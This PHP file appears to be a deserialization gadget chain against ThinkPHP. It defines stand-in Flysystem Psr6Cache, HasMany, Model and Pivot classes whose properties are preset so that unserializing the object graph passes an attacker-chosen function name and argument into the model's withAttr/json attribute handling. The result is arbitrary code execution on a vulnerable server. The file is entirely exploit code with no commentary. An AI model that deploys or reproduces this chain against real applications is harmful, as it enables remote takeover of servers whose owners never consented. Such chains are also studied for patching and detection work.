<?php

namespace League\Flysystem\Cached\Storage
{
    class Psr6Cache
    {
        protected $autosave=false;
        private $pool;
        protected $key='key';

        function __construct($func, $param)
        {
            $this->pool = new \think\model\relation\HasMany($func, $param);
        }
    }
}

namespace think\model\relation
{
    class HasMany
    {
        protected $query=true;
        protected $parent;
        protected $localKey='key';

        function __construct($func, $param)
        {
            $this->parent = new \think\model\Pivot($func, $param);
        }
    }
}

namespace think\model\concern
{
    trait Attribute
    {
        private $data;
        private $withAttr;
        protected $json;
        protected $jsonAssoc;
        protected $strict=true;
    }
}

namespace think
{
    abstract class Model
    {
        use \think\model\concern\Attribute;

        private $data;
        private $withAttr;
        protected $json;
        protected $jsonAssoc;

        function __construct($func, $param)
        {
            $this->data = ["key" => ["key" => $param]];
            $this->jsonAssoc = true;
            $this->withAttr = ["key" => ["key" => $func]];
            $this->json = ["key"];
        }
    }
}

namespace think\model
{
    use \think\Model;

    class Pivot extends Model
    {
    }
}